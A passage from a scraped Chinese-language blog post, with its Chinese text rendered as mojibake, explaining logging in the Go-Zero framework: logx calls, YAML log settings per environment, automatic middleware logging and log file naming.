</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Go-Zero æ—¥å¿—ä½¿ç”¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7588733783571382310</link>    <guid>https://juejin.cn/post/7588733783571382310</guid>    <pubDate>2025-12-29T03:32:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783571382310" data-draft-id="7588711557499617330" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Go-Zero æ—¥å¿—ä½¿ç”¨æŒ‡å—"/> <meta itemprop="keywords" content="Go"/> <meta itemprop="datePublished" content="2025-12-29T03:32:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¡å°”ç‰¹æ–¯"/> <meta itemprop="url" content="https://juejin.cn/user/4450440831840909"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Go-Zero æ—¥å¿—ä½¿ç”¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4450440831840909/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¡å°”ç‰¹æ–¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T03:32:44.000Z" title="Mon Dec 29 2025 03:32:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ—¥å¿—åŸºç¡€ä½¿ç”¨</h2>
<h3 data-id="heading-1">1.1 æ—¥å¿—è¾“å‡ºæ–¹æ³•</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">import</span> <span class="hljs-string">"github.com/zeromicro/go-zero/core/logx"</span>

<span class="hljs-comment">// æ™®é€šæ—¥å¿—</span>
logx.Info(<span class="hljs-string">"æ™®é€šä¿¡æ¯æ—¥å¿—"</span>)
logx.Infof(<span class="hljs-string">"æ ¼å¼åŒ–ä¿¡æ¯: %s"</span>, <span class="hljs-string">"å†…å®¹"</span>)
logx.Infow(<span class="hljs-string">"ç»“æ„åŒ–æ—¥å¿—"</span>, logx.Field(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>))

<span class="hljs-comment">// é”™è¯¯æ—¥å¿—</span>
logx.Error(<span class="hljs-string">"é”™è¯¯æ—¥å¿—"</span>)
logx.Errorf(<span class="hljs-string">"é”™è¯¯: %v"</span>, err)
logx.Errorw(<span class="hljs-string">"ç»“æ„åŒ–é”™è¯¯"</span>, logx.Field(<span class="hljs-string">"error"</span>, err))

<span class="hljs-comment">// è°ƒè¯•æ—¥å¿—ï¼ˆéœ€è¦å¼€å¯ Debug æ¨¡å¼ï¼‰</span>
logx.Debug(<span class="hljs-string">"è°ƒè¯•æ—¥å¿—"</span>)
logx.Debugf(<span class="hljs-string">"è°ƒè¯•: %s"</span>, <span class="hljs-string">"å†…å®¹"</span>)

<span class="hljs-comment">// æ…¢æ—¥å¿—</span>
logx.Slow(<span class="hljs-string">"æ…¢æ“ä½œæ—¥å¿—"</span>)
logx.Slowf(<span class="hljs-string">"æ…¢æ“ä½œ: %dms"</span>, <span class="hljs-number">1000</span>)
logx.Sloww(<span class="hljs-string">"ç»“æ„åŒ–æ…¢æ—¥å¿—"</span>, logx.Field(<span class="hljs-string">"duration"</span>, <span class="hljs-string">"1s"</span>))

<span class="hljs-comment">// ç»Ÿè®¡æ—¥å¿—</span>
logx.Stat(<span class="hljs-string">"ç»Ÿè®¡ä¿¡æ¯"</span>)
logx.Statf(<span class="hljs-string">"ç»Ÿè®¡: %s"</span>, <span class="hljs-string">"å†…å®¹"</span>)

<span class="hljs-comment">// ä¸¥é‡é”™è¯¯æ—¥å¿—</span>
logx.Severe(<span class="hljs-string">"ä¸¥é‡é”™è¯¯"</span>)
logx.Severef(<span class="hljs-string">"ä¸¥é‡é”™è¯¯: %v"</span>, err)
</code></pre>
<h3 data-id="heading-2">1.2 å¸¦ Context çš„æ—¥å¿—</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// æ¨èä½¿ç”¨ï¼Œå¯ä»¥è¿½è¸ªé“¾è·¯</span>
logx.WithContext(ctx).Info(<span class="hljs-string">"å¸¦ä¸Šä¸‹æ–‡çš„æ—¥å¿—"</span>)
logx.WithContext(ctx).Infow(<span class="hljs-string">"ç»“æ„åŒ–æ—¥å¿—"</span>, logx.Field(<span class="hljs-string">"user"</span>, <span class="hljs-string">"å¼ ä¸‰"</span>))
logx.WithContext(ctx).Error(<span class="hljs-string">"å¸¦ä¸Šä¸‹æ–‡çš„é”™è¯¯æ—¥å¿—"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-3">äºŒã€æ—¥å¿—é…ç½®</h2>
<h3 data-id="heading-4">2.1 é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼ˆyamlï¼‰</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Name:</span> <span class="hljs-string">user-api</span>
<span class="hljs-attr">Host:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">8888</span>

<span class="hljs-attr">Log:</span>
  <span class="hljs-comment"># æ—¥å¿—æ¨¡å¼ï¼šconsoleï¼ˆæ§åˆ¶å°ï¼‰ã€fileï¼ˆæ–‡ä»¶ï¼‰ã€volumeï¼ˆå®¹å™¨å·ï¼‰</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>
  
  <span class="hljs-comment"># æ—¥å¿—çº§åˆ«ï¼šdebugã€infoã€errorã€severe</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">info</span>
  
  <span class="hljs-comment"># ç¼–ç æ ¼å¼ï¼šjson æˆ– plain</span>
  <span class="hljs-attr">Encoding:</span> <span class="hljs-string">json</span>
  
  <span class="hljs-comment"># æ–‡ä»¶æ—¥å¿—é…ç½®</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>                    <span class="hljs-comment"># æ—¥å¿—æ–‡ä»¶å­˜æ”¾ç›®å½•</span>
  <span class="hljs-attr">MaxSize:</span> <span class="hljs-number">100</span>                  <span class="hljs-comment"># å•ä¸ªæ—¥å¿—æ–‡ä»¶æœ€å¤§å¤§å°ï¼ˆMBï¼‰</span>
  <span class="hljs-attr">MaxBackups:</span> <span class="hljs-number">5</span>                 <span class="hljs-comment"># ä¿ç•™çš„æ—§æ—¥å¿—æ–‡ä»¶æœ€å¤§æ•°é‡</span>
  <span class="hljs-attr">MaxAge:</span> <span class="hljs-number">30</span>                    <span class="hljs-comment"># ä¿ç•™æ—§æ—¥å¿—æ–‡ä»¶çš„æœ€å¤§å¤©æ•°</span>
  <span class="hljs-attr">Compress:</span> <span class="hljs-literal">true</span>                <span class="hljs-comment"># æ˜¯å¦å‹ç¼©æ—§æ—¥å¿—æ–‡ä»¶</span>
  
  <span class="hljs-comment"># æ—¥å¿—æ‰“å°è°ƒç”¨ä½ç½®</span>
  <span class="hljs-attr">KeepDays:</span> <span class="hljs-number">7</span>                   <span class="hljs-comment"># æ—¥å¿—ä¿ç•™å¤©æ•°</span>
  
  <span class="hljs-comment"># æ˜¯å¦è®°å½•è°ƒç”¨å †æ ˆ</span>
  <span class="hljs-attr">StackCooldownMillis:</span> <span class="hljs-number">100</span>      <span class="hljs-comment"># å †æ ˆå†·å´æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
</code></pre>
<h3 data-id="heading-5">2.2 é…ç½®é¡¹è¯¦ç»†è¯´æ˜</h3>







































































<table><thead><tr><th>é…ç½®é¡¹</th><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Mode</td><td>string</td><td>console</td><td>console-æ§åˆ¶å°è¾“å‡ºï¼Œfile-æ–‡ä»¶è¾“å‡ºï¼Œvolume-å®¹å™¨å·</td></tr><tr><td>Level</td><td>string</td><td>info</td><td>debugã€infoã€errorã€severeï¼Œçº§åˆ«è¶Šä½è¾“å‡ºè¶Šè¯¦ç»†</td></tr><tr><td>Encoding</td><td>string</td><td>json</td><td>json-JSONæ ¼å¼ï¼Œplain-çº¯æ–‡æœ¬æ ¼å¼</td></tr><tr><td>Path</td><td>string</td><td>logs</td><td>æ—¥å¿—æ–‡ä»¶å­˜æ”¾è·¯å¾„ï¼ˆç›¸å¯¹æˆ–ç»å¯¹è·¯å¾„ï¼‰</td></tr><tr><td>MaxSize</td><td>int</td><td>100</td><td>å•ä¸ªæ—¥å¿—æ–‡ä»¶æœ€å¤§å¤§å°ï¼ˆMBï¼‰</td></tr><tr><td>MaxBackups</td><td>int</td><td>5</td><td>ä¿ç•™çš„æ—§æ—¥å¿—æ–‡ä»¶æœ€å¤§æ•°é‡</td></tr><tr><td>MaxAge</td><td>int</td><td>30</td><td>ä¿ç•™æ—§æ—¥å¿—æ–‡ä»¶çš„æœ€å¤§å¤©æ•°</td></tr><tr><td>Compress</td><td>bool</td><td>false</td><td>æ˜¯å¦å‹ç¼©å½’æ¡£çš„æ—¥å¿—æ–‡ä»¶</td></tr><tr><td>KeepDays</td><td>int</td><td>7</td><td>æ—¥å¿—ä¿ç•™å¤©æ•°ï¼ˆä¼˜å…ˆçº§é«˜äºMaxAgeï¼‰</td></tr><tr><td>StackCooldownMillis</td><td>int</td><td>100</td><td>å †æ ˆå†·å´æ—¶é—´ï¼Œé¿å…é¢‘ç¹æ‰“å°å †æ ˆ</td></tr></tbody></table>
<h3 data-id="heading-6">2.3 ä¸åŒç¯å¢ƒçš„æ—¥å¿—é…ç½®å»ºè®®</h3>
<h4 data-id="heading-7">å¼€å‘ç¯å¢ƒ</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">console</span>       <span class="hljs-comment"># æ§åˆ¶å°è¾“å‡ºï¼Œæ–¹ä¾¿æŸ¥çœ‹</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">debug</span>        <span class="hljs-comment"># è¯¦ç»†æ—¥å¿—ï¼Œä¾¿äºè°ƒè¯•</span>
  <span class="hljs-attr">Encoding:</span> <span class="hljs-string">plain</span>     <span class="hljs-comment"># çº¯æ–‡æœ¬ï¼Œæ˜“è¯»</span>
</code></pre>
<h4 data-id="heading-8">æµ‹è¯•ç¯å¢ƒ</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>          <span class="hljs-comment"># æ–‡ä»¶è¾“å‡ºï¼Œæ–¹ä¾¿é—®é¢˜è¿½æº¯</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">info</span>         <span class="hljs-comment"># æ ‡å‡†æ—¥å¿—çº§åˆ«</span>
  <span class="hljs-attr">Encoding:</span> <span class="hljs-string">json</span>      <span class="hljs-comment"># JSONæ ¼å¼ï¼Œä¾¿äºæ—¥å¿—åˆ†æ</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>
  <span class="hljs-attr">KeepDays:</span> <span class="hljs-number">3</span>
</code></pre>
<h4 data-id="heading-9">ç”Ÿäº§ç¯å¢ƒ</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>          <span class="hljs-comment"># æ–‡ä»¶è¾“å‡º</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">info</span>         <span class="hljs-comment"># åªè®°å½•é‡è¦æ—¥å¿—ï¼ˆæˆ– errorï¼‰</span>
  <span class="hljs-attr">Encoding:</span> <span class="hljs-string">json</span>      <span class="hljs-comment"># JSONæ ¼å¼ï¼Œä¾¿äºæ—¥å¿—æ”¶é›†ç³»ç»Ÿè§£æ</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">/var/log/app</span>  <span class="hljs-comment"># ç»å¯¹è·¯å¾„</span>
  <span class="hljs-attr">MaxSize:</span> <span class="hljs-number">500</span>        <span class="hljs-comment"># å¤§å®¹é‡</span>
  <span class="hljs-attr">MaxBackups:</span> <span class="hljs-number">10</span>
  <span class="hljs-attr">MaxAge:</span> <span class="hljs-number">30</span>
  <span class="hljs-attr">Compress:</span> <span class="hljs-literal">true</span>      <span class="hljs-comment"># å‹ç¼©èŠ‚çœç©ºé—´</span>
  <span class="hljs-attr">KeepDays:</span> <span class="hljs-number">30</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">ä¸‰ã€é…ç½®ä¸ä¸é…ç½® Log çš„åŒºåˆ«</h2>
<h3 data-id="heading-11">3.1 ä¸é…ç½® Logï¼ˆä½¿ç”¨é»˜è®¤é…ç½®ï¼‰</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># é…ç½®æ–‡ä»¶ä¸­ä¸å†™ Log é…ç½®é¡¹</span>
<span class="hljs-attr">Name:</span> <span class="hljs-string">user-api</span>
<span class="hljs-attr">Host:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">8888</span>
</code></pre>
<p><strong>é»˜è®¤è¡Œä¸ºï¼š</strong></p>
<ul>
<li>Mode: <code>console</code> - æ—¥å¿—è¾“å‡ºåˆ°æ§åˆ¶å°</li>
<li>Level: <code>info</code> - åªè¾“å‡º info åŠä»¥ä¸Šçº§åˆ«çš„æ—¥å¿—</li>
<li>Encoding: <code>json</code> - JSON æ ¼å¼è¾“å‡º</li>
<li><strong>ä¸ä¼šç”Ÿæˆæ—¥å¿—æ–‡ä»¶</strong></li>
<li>æ—¥å¿—åªåœ¨æ§åˆ¶å°æ˜¾ç¤ºï¼Œé‡å¯åä¸¢å¤±</li>
</ul>
<h3 data-id="heading-12">3.2 é…ç½® Log</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">Name:</span> <span class="hljs-string">user-api</span>
<span class="hljs-attr">Host:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">8888</span>
<span class="hljs-attr">Log:</span>
  <span class="hljs-attr">Mode:</span> <span class="hljs-string">file</span>
  <span class="hljs-attr">Level:</span> <span class="hljs-string">info</span>
  <span class="hljs-attr">Path:</span> <span class="hljs-string">logs</span>
</code></pre>
<p><strong>è¡Œä¸ºï¼š</strong></p>
<ul>
<li>æ—¥å¿—è¾“å‡ºåˆ°æ–‡ä»¶</li>
<li>æ—¥å¿—æŒä¹…åŒ–ä¿å­˜</li>
<li>å¯ä»¥é…ç½®æ—¥å¿—è½®è½¬ã€å‹ç¼©ç­‰</li>
<li>å¯ä»¥é€šè¿‡æ—¥å¿—æ”¶é›†ç³»ç»Ÿç»Ÿä¸€ç®¡ç†</li>
</ul>
<h3 data-id="heading-13">3.3 æœ€ä½³å®è·µ</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åœ¨ main.go ä¸­æ ¹æ®ç¯å¢ƒåŠ¨æ€é…ç½®</span>
<span class="hljs-keyword">var</span> c config.Config
conf.MustLoad(*configFile, &amp;c)

<span class="hljs-comment">// å¦‚æœé…ç½®æ–‡ä»¶æ²¡æœ‰ Log é…ç½®ï¼Œå¯ä»¥ä»£ç ä¸­è®¾ç½®</span>
<span class="hljs-keyword">if</span> c.Log.Mode == <span class="hljs-string">""</span> {
    logx.MustSetup(logx.LogConf{
        Mode:     <span class="hljs-string">"file"</span>,
        Level:    <span class="hljs-string">"info"</span>,
        Encoding: <span class="hljs-string">"json"</span>,
        Path:     <span class="hljs-string">"logs"</span>,
    })
}
</code></pre>
<hr/>
<h2 data-id="heading-14">å››ã€æ—¥å¿—æ”¶é›†åœºæ™¯ä¸ä½ç½®</h2>
<h3 data-id="heading-15">4.1 è‡ªåŠ¨æ—¥å¿—æ”¶é›†åœºæ™¯</h3>
<h4 data-id="heading-16">1. HTTP ä¸­é—´ä»¶è‡ªåŠ¨æ”¶é›†</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// rest.Server è‡ªåŠ¨è®°å½•çš„æ—¥å¿—</span>
<span class="hljs-comment">// ä½ç½®ï¼šrest/handler/loghandler.go</span>

âœ… è¯·æ±‚å¼€å§‹æ—¶é—´
âœ… è¯·æ±‚æ–¹æ³•å’Œè·¯å¾„
âœ… è¯·æ±‚è€—æ—¶
âœ… HTTPçŠ¶æ€ç 
âœ… è¯·æ±‚ä½“å¤§å°
âœ… é”™è¯¯ä¿¡æ¯ï¼ˆå¦‚æœæœ‰ï¼‰

<span class="hljs-comment">// æ—¥å¿—ç¤ºä¾‹</span>
{
  <span class="hljs-string">"@timestamp"</span>: <span class="hljs-string">"2025-12-29T10:30:00.123Z"</span>,
  <span class="hljs-string">"level"</span>: <span class="hljs-string">"info"</span>,
  <span class="hljs-string">"content"</span>: <span class="hljs-string">"GET /api/users/1"</span>,
  <span class="hljs-string">"duration"</span>: <span class="hljs-string">"15.2ms"</span>,
  <span class="hljs-string">"code"</span>: <span class="hljs-number">200</span>
}
</code></pre>
<h4 data-id="heading-17">2. RPC ä¸­é—´ä»¶è‡ªåŠ¨æ”¶é›†</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// zrpc.Server è‡ªåŠ¨è®°å½•çš„æ—¥å¿—</span>
<span class="hljs-comment">// ä½ç½®ï¼šzrpc/internal/serverinterceptors/statinterceptor.go</span>

âœ… RPCæ–¹æ³•å
âœ… è°ƒç”¨è€—æ—¶
âœ… é”™è¯¯ä¿¡æ¯
âœ… è°ƒç”¨å‚æ•°ï¼ˆå¯é€‰ï¼‰
</code></pre>
<h4 data-id="heading-18">3. æ•°æ®åº“æ“ä½œæ—¥å¿—</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// sqlx è‡ªåŠ¨è®°å½•æ…¢æŸ¥è¯¢</span>
<span class="hljs-comment">// æ…¢æŸ¥è¯¢é˜ˆå€¼ï¼šé»˜è®¤ 500ms</span>

âœ… SQLè¯­å¥
âœ… æ‰§è¡Œè€—æ—¶
âœ… å—å½±å“è¡Œæ•°
</code></pre>
<h4 data-id="heading-19">4. ç¼“å­˜æ“ä½œæ—¥å¿—</h4>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// redis/cache è‡ªåŠ¨è®°å½•æ…¢æ“ä½œ</span>
<span class="hljs-comment">// æ…¢æ“ä½œé˜ˆå€¼ï¼šå¯é…ç½®</span>

âœ… Rediså‘½ä»¤
âœ… æ‰§è¡Œè€—æ—¶
âœ… ç¼“å­˜é”®
</code></pre>
<h3 data-id="heading-20">4.2 æ‰‹åŠ¨æ—¥å¿—æ”¶é›†åœºæ™¯</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘å±‚</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(l *UserLogic)</span></span> GetUser(req *types.GetUserReq) (*types.User, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// å…³é”®ä¸šåŠ¡æ“ä½œè®°å½•</span>
    logx.WithContext(l.ctx).Infow(<span class="hljs-string">"å¼€å§‹è·å–ç”¨æˆ·ä¿¡æ¯"</span>,
        logx.Field(<span class="hljs-string">"userId"</span>, req.UserId))
    
    user, err := l.svcCtx.UserModel.FindOne(l.ctx, req.UserId)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-comment">// é”™è¯¯æ—¥å¿—</span>
        logx.WithContext(l.ctx).Errorw(<span class="hljs-string">"è·å–ç”¨æˆ·å¤±è´¥"</span>,
            logx.Field(<span class="hljs-string">"userId"</span>, req.UserId),
            logx.Field(<span class="hljs-string">"error"</span>, err.Error()))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    
    <span class="hljs-comment">// æˆåŠŸæ—¥å¿—</span>
    logx.WithContext(l.ctx).Infow(<span class="hljs-string">"ç”¨æˆ·ä¿¡æ¯è·å–æˆåŠŸ"</span>,
        logx.Field(<span class="hljs-string">"userId"</span>, req.UserId),
        logx.Field(<span class="hljs-string">"userName"</span>, user.Name))
    
    <span class="hljs-keyword">return</span> &amp;types.User{
        Id:   user.Id,
        Name: user.Name,
    }, <span class="hljs-literal">nil</span>
}
</code></pre>
<h3 data-id="heading-21">4.3 æ—¥å¿—æ”¶é›†æœ€ä½³å®è·µ</h3>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// âœ… æ¨èï¼šå…³é”®ä¸šåŠ¡èŠ‚ç‚¹è®°å½•</span>
- ç”¨æˆ·ç™»å½•/ç™»å‡º
- è®¢å•åˆ›å»º/æ”¯ä»˜
- é‡è¦æ•°æ®çš„å¢åˆ æ”¹
- å¤–éƒ¨APIè°ƒç”¨
- å¼‚å¸¸é”™è¯¯

<span class="hljs-comment">// âŒ ä¸æ¨èï¼šè¿‡åº¦æ—¥å¿—</span>
- å¾ªç¯å†…çš„æ—¥å¿—
- é«˜é¢‘è°ƒç”¨çš„æ¥å£æ—¥å¿—
- æ•æ„Ÿä¿¡æ¯ï¼ˆå¯†ç ã€tokenç­‰ï¼‰
</code></pre>
<hr/>
<h2 data-id="heading-22">äº”ã€æ—¥å¿—æ–‡ä»¶å­˜å‚¨è§„åˆ™</h2>
<h3 data-id="heading-23">5.1 æ—¥å¿—æ–‡ä»¶å‘½åè§„åˆ™</h3>
<pre><code class="hljs language-lua" lang="lua">logs/
â”œâ”€â”€ access.<span class="hljs-built_in">log</span>          # å½“å‰è®¿é—®æ—¥å¿—
â”œâ”€â”€ <span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>           # å½“å‰é”™è¯¯æ—¥å¿—
â”œâ”€â”€ severe.<span class="hljs-built_in">log</span>          # å½“å‰ä¸¥é‡é”™è¯¯æ—¥å¿—
â”œâ”€â”€ slow.<span class="hljs-built_in">log</span>            # å½“å‰æ…¢æ—¥å¿—
â”œâ”€â”€ stat.<span class="hljs-built_in">log</span>            # å½“å‰ç»Ÿè®¡æ—¥å¿—
â”œâ”€â”€ access.<span class="hljs-built_in">log</span><span class="hljs-number">.2025122901</span>  # å½’æ¡£çš„è®¿é—®æ—¥å¿—
â”œâ”€â”€ access.<span class="hljs-built_in">log</span><span class="hljs-number">.2025122902</span>
â””â”€â”€ <span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span><span class="hljs-number">.2025122901</span>   # å½’æ¡£çš„é”™è¯¯æ—¥å¿—
</code></pre>
<h3 data-id="heading-24">5.2 æ—¥å¿—åˆ†ç±»å­˜å‚¨</h3>









































